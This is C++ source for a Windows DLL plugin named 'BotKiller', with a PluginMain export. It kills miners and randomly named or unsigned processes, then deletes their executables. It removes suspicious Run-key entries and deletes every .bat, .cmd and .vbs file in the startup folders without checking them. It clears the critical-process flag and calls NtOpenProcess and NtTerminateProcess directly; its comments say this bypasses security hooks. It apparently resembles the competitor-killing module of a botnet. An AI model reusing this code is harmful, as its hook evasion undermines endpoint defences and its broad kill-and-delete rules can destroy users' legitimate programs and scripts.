// BotKiller — kills unsigned/random-named malware and concurrent miners.
// Miner names: always kill. Random+unsigned in suspicious path: kill.
// High-CPU+unsigned in any non-system path (admin): strong miner signal → kill.
// Anti-kill: CriticalProcess clear + NtOpenProcess bypass + NtTerminateProcess fallback.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>

// ── string helpers ────────────────────────────────────────────────────────
static int  _Len(const wchar_t* s){int n=0;while(s[n])n++;return n;}
static BOOL _IEq(const wchar_t* a,const wchar_t* b){
    while(*a&&*b){wchar_t ca=*a,cb=*b;if(ca>='A'&&ca<='Z')ca+=32;if(cb>='A'&&cb<='Z')cb+=32;if(ca!=cb)return FALSE;a++;b++;}
    return *a==0&&*b==0;
}
static BOOL _IStart(const wchar_t* s,const wchar_t* p){
    while(*p){wchar_t a=*s,b=*p;if(!a)return FALSE;
    if(a>='A'&&a<='Z')a+=32;if(b>='A'&&b<='Z')b+=32;if(a!=b)return FALSE;s++;p++;}return TRUE;
}

// ── privilege / ntdll handles ─────────────────────────────────────────────
static BOOL s_isAdmin=FALSE;
static HMODULE s_ntdll=NULL;
typedef LONG(WINAPI* fnNSIP_t)(HANDLE,ULONG,PVOID,ULONG);
typedef LONG(WINAPI* fnNTP_t)(HANDLE,LONG);

// NtOpenProcess — bypasses IAT hooks on OpenProcess
typedef struct { ULONG Length; HANDLE RootDirectory; void* ObjectName; ULONG Attributes; void* SecurityDescriptor; void* SecurityQualityOfService; } _OA;
typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } _CID;
typedef LONG(WINAPI* fnNtOP_t)(HANDLE*,DWORD,_OA*,_CID*);

static void _InitPriv(){
    s_ntdll=GetModuleHandleW(L"ntdll.dll");
    HANDLE ht=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,&ht))return;
    TOKEN_ELEVATION te={};DWORD sz=0;
    if(GetTokenInformation(ht,TokenElevation,(LPVOID)&te,sizeof(te),&sz))s_isAdmin=te.TokenIsElevated;
    if(!s_isAdmin){
        BYTE buf[256]={};sz=0;
        if(GetTokenInformation(ht,TokenUser,buf,sizeof(buf),&sz)){
            TOKEN_USER*tu=(TOKEN_USER*)buf;
            if(IsWellKnownSid(tu->User.Sid,WinLocalSystemSid))s_isAdmin=TRUE;
        }
    }
    if(s_isAdmin){
        LUID luid={};
        if(LookupPrivilegeValueW(NULL,L"SeDebugPrivilege",&luid)){
            TOKEN_PRIVILEGES tp={1,{{luid,SE_PRIVILEGE_ENABLED}}};
            AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
        }
    }
    CloseHandle(ht);
}

// ── safe list (never kill regardless of name or signature) ─────────────────
static const wchar_t* s_safe[]={
    L"system",L"smss.exe",L"csrss.exe",L"wininit.exe",L"winlogon.exe",
    L"services.exe",L"lsass.exe",L"svchost.exe",L"explorer.exe",
    L"dwm.exe",L"taskhostw.exe",L"sihost.exe",L"ctfmon.exe",
    L"conhost.exe",L"dllhost.exe",L"runtimebroker.exe",
    L"msiexec.exe",L"wermgr.exe",L"audiodg.exe",
    L"spoolsv.exe",L"searchindexer.exe",L"fontdrvhost.exe",
    L"chrome.exe",L"firefox.exe",L"msedge.exe",L"brave.exe",
    L"opera.exe",L"vivaldi.exe",L"iexplore.exe",
    L"discord.exe",L"slack.exe",L"teams.exe",
    L"telegram.exe",L"ayugram.exe",L"unigram.exe",
    L"code.exe",L"devenv.exe",L"node.exe",L"git.exe",
    L"steam.exe",L"epicgameslauncher.exe",L"origin.exe",
    L"spotify.exe",L"onedrive.exe",L"dropbox.exe",
    NULL
};
static BOOL _IsSafe(const wchar_t* n){for(int i=0;s_safe[i];i++)if(_IEq(n,s_safe[i]))return TRUE;return FALSE;}

// ── known miner names ─────────────────────────────────────────────────────
static const wchar_t* s_miners[]={
    L"xmrig.exe",L"xmrig-cuda.exe",L"xmrig-opencl.exe",L"xmrig-mo.exe",
    L"cpuminer.exe",L"cpuminer-opt.exe",L"minerd.exe",
    L"ethminer.exe",L"nbminer.exe",L"t-rex.exe",L"gminer.exe",
    L"lolminer.exe",L"teamredminer.exe",L"nanominer.exe",
    L"bzminer.exe",L"wildrig.exe",L"srbminer.exe",L"cryptonight.exe",
    NULL
};
static BOOL _IsKnownMiner(const wchar_t* n){for(int i=0;s_miners[i];i++)if(_IEq(n,s_miners[i]))return TRUE;return FALSE;}

// ── path helpers ──────────────────────────────────────────────────────────
static wchar_t s_tmp[MAX_PATH]={},s_sys[MAX_PATH]={},s_win[MAX_PATH]={},
               s_pf[MAX_PATH]={},s_pf86[MAX_PATH]={},
               s_app[MAX_PATH]={},s_lapp[MAX_PATH]={};
static void _InitPaths(){
    GetTempPathW(MAX_PATH,s_tmp);
    GetSystemDirectoryW(s_sys,MAX_PATH);
    GetWindowsDirectoryW(s_win,MAX_PATH);
    ExpandEnvironmentStringsW(L"%ProgramFiles%",s_pf,MAX_PATH);
    ExpandEnvironmentStringsW(L"%ProgramFiles(x86)%",s_pf86,MAX_PATH);
    ExpandEnvironmentStringsW(L"%APPDATA%",s_app,MAX_PATH);
    ExpandEnvironmentStringsW(L"%LOCALAPPDATA%",s_lapp,MAX_PATH);
}
static BOOL _InTmp(const wchar_t* p){return s_tmp[0]&&_IStart(p,s_tmp);}
static BOOL _InAppData(const wchar_t* p){
    return (s_app[0]&&_IStart(p,s_app))||(s_lapp[0]&&_IStart(p,s_lapp));
}
static BOOL _IsProtected(const wchar_t* p){
    return (s_sys[0]&&_IStart(p,s_sys))||(s_win[0]&&_IStart(p,s_win))||
           (s_pf[0]&&_IStart(p,s_pf))||(s_pf86[0]&&_IStart(p,s_pf86));
}

// ── random name detection ─────────────────────────────────────────────────
// Random = no vowels (>=6 chars) OR all-hex (>=8 chars) OR all-digits (>=6 chars).
static BOOL _IsRandomName(const wchar_t* fname){
    wchar_t base[MAX_PATH]={};int bl=0;
    for(int i=0;fname[i]&&fname[i]!=L'.';i++){base[bl++]=fname[i];}
    if(bl<6)return FALSE;
    BOOL hasVowel=FALSE,allAlphaNum=TRUE,allHex=TRUE,allDigit=TRUE;
    for(int i=0;i<bl;i++){
        wchar_t c=base[i];
        wchar_t lc=(c>='A'&&c<='Z')?c+32:c;
        if(lc==L'a'||lc==L'e'||lc==L'i'||lc==L'o'||lc==L'u')hasVowel=TRUE;
        BOOL isAlpha=(lc>=L'a'&&lc<=L'z');
        BOOL isDigit=(c>=L'0'&&c<=L'9');
        if(!isAlpha&&!isDigit)allAlphaNum=FALSE;
        if(!(isDigit||(lc>=L'a'&&lc<=L'f')))allHex=FALSE;
        if(!isDigit)allDigit=FALSE;
    }
    if(!allAlphaNum)return FALSE;
    if(!hasVowel)return TRUE;
    if(allHex&&bl>=8)return TRUE;
    if(allDigit&&bl>=6)return TRUE;
    return FALSE;
}

// ── version info check (proxy for unsigned) ───────────────────────────────
typedef DWORD(WINAPI* fnGFVIS_t)(LPCWSTR,LPDWORD);
static fnGFVIS_t s_gfvis=NULL;
static BOOL _HasVersionInfo(const wchar_t* path){
    if(!s_gfvis||!path||!path[0])return TRUE;
    DWORD dummy=0;return s_gfvis(path,&dummy)>0;
}

// ── CPU usage ratio check (for miner detection) ───────────────────────────
// Returns TRUE if process used more CPU time than wall time since creation
// (i.e. >100% of 1 logical core over its lifetime) — strong miner signal.
static BOOL _IsHighCpu(DWORD pid){
    DWORD acc=s_isAdmin?PROCESS_QUERY_INFORMATION:PROCESS_QUERY_LIMITED_INFORMATION;
    HANDLE hp=OpenProcess(acc,FALSE,pid);
    if(!hp)hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
    if(!hp)return FALSE;
    FILETIME ct={},et={},kt={},ut={};
    BOOL ok=GetProcessTimes(hp,&ct,&et,&kt,&ut);
    CloseHandle(hp);
    if(!ok)return FALSE;
    FILETIME now={};GetSystemTimeAsFileTime(&now);
    ULONGLONG elapsed=((ULONGLONG)now.dwHighDateTime<<32|now.dwLowDateTime)-
                      ((ULONGLONG)ct.dwHighDateTime<<32|ct.dwLowDateTime);
    if(elapsed<100000000ULL)return FALSE; // ignore processes running <10 seconds
    ULONGLONG cpu=((ULONGLONG)kt.dwHighDateTime<<32|kt.dwLowDateTime)+
                  ((ULONGLONG)ut.dwHighDateTime<<32|ut.dwLowDateTime);
    return cpu>elapsed; // consumed more than 1 full core-second per second
}

// ── get process exe path ─────────────────────────────────────────────────
typedef BOOL(WINAPI* fnQFPN_t)(HANDLE,DWORD,LPWSTR,PDWORD);
static fnQFPN_t s_qfpn=NULL;
static void _GetExePath(DWORD pid,wchar_t* out,DWORD max){
    out[0]=0;
    DWORD acc=s_isAdmin?PROCESS_QUERY_INFORMATION:PROCESS_QUERY_LIMITED_INFORMATION;
    HANDLE hp=OpenProcess(acc,FALSE,pid);
    if(!hp)hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
    if(!hp)return;
    if(s_qfpn){DWORD m=max;s_qfpn(hp,0,out,&m);}
    CloseHandle(hp);
}

// ── log helper ────────────────────────────────────────────────────────────
static wchar_t s_logPath[MAX_PATH]={};
static void _Log(const char* tag,const wchar_t* name,const wchar_t* reason){
    if(!s_logPath[0])return;
    char line[512]={};char* p=line;
    while(*tag)*p++=*tag++;
    for(int i=0;name[i]&&(p-line)<400;i++)*p++=(char)name[i];
    if(reason){*p++=' ';*p++='(';for(int i=0;reason[i]&&(p-line)<490;i++)*p++=(char)reason[i];*p++=')';}
    *p++='\n';
    HANDLE hf=CreateFileW(s_logPath,FILE_APPEND_DATA,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE)return;
    DWORD wr=0;WriteFile(hf,line,(DWORD)(p-line),&wr,NULL);CloseHandle(hf);
}

// ── open process handle, with NtOpenProcess fallback ─────────────────────
static HANDLE _OpenTarget(DWORD pid,DWORD access){
    DWORD acc=s_isAdmin?access|PROCESS_ALL_ACCESS:access;
    HANDLE hp=OpenProcess(acc,FALSE,pid);
    if(!hp)hp=OpenProcess(access,FALSE,pid);
    // NtOpenProcess fallback — bypasses usermode IAT hooks on OpenProcess
    if(!hp&&s_ntdll){
        fnNtOP_t fnNtOP=(fnNtOP_t)GetProcAddress(s_ntdll,"NtOpenProcess");
        if(fnNtOP){
            HANDLE h2=NULL;
            _OA oa={sizeof(_OA)};
            _CID cid={(HANDLE)(ULONG_PTR)pid,NULL};
            if(fnNtOP(&h2,access,&oa,&cid)==0)hp=h2;
        }
    }
    return hp;
}

// ── anti-kill bypass + kill ───────────────────────────────────────────────
static void _SafeKill(DWORD pid,const wchar_t* name,const wchar_t* path,const wchar_t* reason){
    HANDLE hp=_OpenTarget(pid,PROCESS_TERMINATE|PROCESS_SET_INFORMATION);
    if(!hp)return;

    // Remove CriticalProcess flag so termination won't BSOD
    if(s_ntdll){
        fnNSIP_t fnNSIP=(fnNSIP_t)GetProcAddress(s_ntdll,"NtSetInformationProcess");
        if(fnNSIP){ULONG v=0;fnNSIP(hp,29/*ProcessBreakOnTermination*/,&v,sizeof(v));}
    }

    BOOL ok=TerminateProcess(hp,0);

    // NtTerminateProcess fallback — bypasses usermode hooks on TerminateProcess
    if(!ok&&s_ntdll){
        fnNTP_t fnNTP=(fnNTP_t)GetProcAddress(s_ntdll,"NtTerminateProcess");
        if(fnNTP){fnNTP(hp,0);ok=TRUE;}
    }
    CloseHandle(hp);

    if(ok){
        _Log("[Kill] ",name,reason);
        if(path&&path[0])
            for(int i=0;i<8;i++){Sleep(250);if(DeleteFileW(path)){_Log("[Del]  ",path,NULL);break;}}
    }
}

// ── process scan ─────────────────────────────────────────────────────────
static int _ScanProcs(DWORD myPid){
    int n=0;
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs==INVALID_HANDLE_VALUE)return 0;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    if(Process32FirstW(hs,&pe)){do{
        DWORD pid=pe.th32ProcessID;
        if(pid==myPid||pid==0||pid==4)continue;
        if(_IsSafe(pe.szExeFile))continue;

        wchar_t path[MAX_PATH]={};
        _GetExePath(pid,path,MAX_PATH);

        const wchar_t* reason=NULL;

        // 1. Known miner binary — kill regardless of path or signature
        if(_IsKnownMiner(pe.szExeFile))
            reason=L"known miner";

        // 2. %TEMP% + random name or unsigned — high confidence malware drop
        else if(path[0]&&_InTmp(path)&&(_IsRandomName(pe.szExeFile)||!_HasVersionInfo(path)))
            reason=L"temp+random/unsigned";

        // 3. %APPDATA%/%LOCALAPPDATA% + random name + unsigned — common persistence location
        else if(path[0]&&_InAppData(path)&&_IsRandomName(pe.szExeFile)&&!_HasVersionInfo(path))
            reason=L"appdata+random+unsigned";

        // 4. Any user-writable path + random name + unsigned (admin only)
        else if(s_isAdmin&&path[0]&&!_IsProtected(path)&&
                _IsRandomName(pe.szExeFile)&&!_HasVersionInfo(path))
            reason=L"random+unsigned";

        // 5. High CPU + unsigned + not in protected path — evasively named miner (admin only)
        else if(s_isAdmin&&path[0]&&!_IsProtected(path)&&!_HasVersionInfo(path)&&_IsHighCpu(pid))
            reason=L"highcpu+unsigned";

        if(reason){_SafeKill(pid,pe.szExeFile,path,reason);n++;}
    }while(Process32NextW(hs,&pe));}
    CloseHandle(hs);return n;
}

static wchar_t* _FName(wchar_t* p){int l=_Len(p);for(int i=l-1;i>=0;i--)if(p[i]==L'\\'||p[i]==L'/')return p+i+1;return p;}

static void _CleanKey(HKEY root,const wchar_t* sub){
    HKEY hk=NULL;if(RegOpenKeyExW(root,sub,0,KEY_READ|KEY_WRITE,&hk)!=ERROR_SUCCESS)return;
    wchar_t dels[32][256]={};int dc=0;
    for(DWORD i=0;dc<32;i++){
        wchar_t nm[256]={};DWORD nl=256;
        BYTE raw[MAX_PATH*2+4]={};DWORD dl=sizeof(raw);DWORD tp=0;
        if(RegEnumValueW(hk,i,nm,&nl,NULL,&tp,raw,&dl)!=ERROR_SUCCESS)break;
        if(tp!=REG_SZ&&tp!=REG_EXPAND_SZ)continue;
        wchar_t* v=(wchar_t*)raw;if(*v==L'"')v++;
        wchar_t pb[MAX_PATH]={};int pi=0;
        while(v[pi]&&v[pi]!=L'"'&&v[pi]!=L' '&&pi<MAX_PATH-1){pb[pi]=v[pi];pi++;}
        wchar_t* fn=_FName(pb);
        if(_InTmp(pb)||_IsKnownMiner(fn)||
           (pb[0]&&_InAppData(pb)&&_IsRandomName(fn)&&!_HasVersionInfo(pb))||
           (s_isAdmin&&pb[0]&&!_IsProtected(pb)&&_IsRandomName(fn)&&!_HasVersionInfo(pb))){
            _Log("[Reg]  ",nm,pb);
            for(int j=0;j<256&&nm[j];j++)dels[dc][j]=nm[j];dc++;
        }
    }
    for(int i=0;i<dc;i++)RegDeleteValueW(hk,dels[i]);
    RegCloseKey(hk);
}

static void _CleanStartup(const wchar_t* folder){
    wchar_t pat[MAX_PATH]={};int fl=_Len(folder);
    for(int i=0;i<fl;i++)pat[i]=folder[i];
    pat[fl]=L'\\';pat[fl+1]=L'*';
    WIN32_FIND_DATAW fd={};HANDLE hf=FindFirstFileW(pat,&fd);
    if(hf==INVALID_HANDLE_VALUE)return;
    do{
        if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)continue;
        int nl=_Len(fd.cFileName);if(nl<5)continue;
        const wchar_t* ext=fd.cFileName+nl-4;
        if(!_IEq(ext,L".bat")&&!_IEq(ext,L".cmd")&&!_IEq(ext,L".vbs"))continue;
        wchar_t full[MAX_PATH]={};for(int i=0;i<fl;i++)full[i]=folder[i];
        full[fl]=L'\\';for(int i=0;fd.cFileName[i]&&i<MAX_PATH-fl-2;i++)full[fl+1+i]=fd.cFileName[i];
        if(DeleteFileW(full))_Log("[Del]  ",fd.cFileName,full);
    }while(FindNextFileW(hf,&fd));
    FindClose(hf);
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    _InitPaths();
    _InitPriv();
    HMODULE hK=GetModuleHandleW(L"kernel32.dll");
    if(hK)s_qfpn=(fnQFPN_t)GetProcAddress(hK,"QueryFullProcessImageNameW");

    HMODULE hV=LoadLibraryW(L"version.dll");
    if(hV)s_gfvis=(fnGFVIS_t)GetProcAddress(hV,"GetFileVersionInfoSizeW");

    GetEnvironmentVariableW(L"SERO_PLUGIN_LOG",s_logPath,MAX_PATH);
    _Log(s_isAdmin?"[Priv] admin/SYSTEM":"[Priv] user",L"",NULL);

    DWORD myPid=GetCurrentProcessId();
    int killed=_ScanProcs(myPid);

    static const wchar_t* runKeys[]={
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        NULL};
    for(int i=0;runKeys[i];i++){
        _CleanKey(HKEY_CURRENT_USER,runKeys[i]);
        if(s_isAdmin)_CleanKey(HKEY_LOCAL_MACHINE,runKeys[i]);
    }

    wchar_t startup[MAX_PATH]={};
    ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",startup,MAX_PATH);
    _CleanStartup(startup);
    if(s_isAdmin){
        ExpandEnvironmentStringsW(L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",startup,MAX_PATH);
        _CleanStartup(startup);
    }

    if(killed==0)
        _Log("[OK] Aucun processus suspect trouve",L"",NULL);
    else{
        char sum[64]="[OK] Tue: ";char*p=sum;while(*p)p++;
        char tmp[12];int i=0,n=killed;
        if(n==0){*p++='0';}else{while(n>0){tmp[i++]='0'+(n%10);n/=10;}while(i>0)*p++=tmp[--i];}
        const char* suf=" processus";while(*suf)*p++=*suf++;*p=0;
        _Log(sum,L"",NULL);
    }

    if(hV)FreeLibrary(hV);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
